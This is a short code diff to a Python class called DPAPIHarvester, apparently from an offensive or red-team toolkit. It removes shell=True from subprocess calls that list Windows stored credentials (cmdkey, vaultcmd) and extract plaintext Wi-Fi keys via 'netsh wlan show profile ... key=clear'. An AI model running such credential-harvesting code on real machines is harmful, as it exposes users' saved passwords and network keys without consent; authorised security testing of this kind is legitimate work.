@@ -121,7 +121,7 @@ class DPAPIHarvester:
         try:
             result = subprocess.run(
                 ["cmdkey", "/list"],
-                capture_output=True, text=True, timeout=10, shell=True,
+                capture_output=True, text=True, timeout=10,
             )
             for line in result.stdout.splitlines():
                 if "Target:" in line:
@@ -199,7 +199,7 @@ class DPAPIHarvester:
         try:
             result = subprocess.run(
                 ["netsh", "wlan", "show", "profiles"],
-                capture_output=True, text=True, timeout=10, shell=True,
+                capture_output=True, text=True, timeout=10,
             )
             profiles = []
             for line in result.stdout.splitlines():
@@ -209,7 +209,7 @@ class DPAPIHarvester:
                 try:
                     key_result = subprocess.run(
                         ["netsh", "wlan", "show", "profile", profile, "key=clear"],
-                        capture_output=True, text=True, timeout=10, shell=True,
+                        capture_output=True, text=True, timeout=10,
                     )
                     for vline in key_result.stdout.splitlines():
                         if "Key Content" in vline:
@@ -243,7 +243,7 @@ class DPAPIHarvester:
         try:
             result = subprocess.run(
                 ["vaultcmd", "/list"],
-                capture_output=True, text=True, timeout=10, shell=True,
+                capture_output=True, text=True, timeout=10,
             )
             for line in result.stdout.splitlines():
                 if "Vault:" in line:
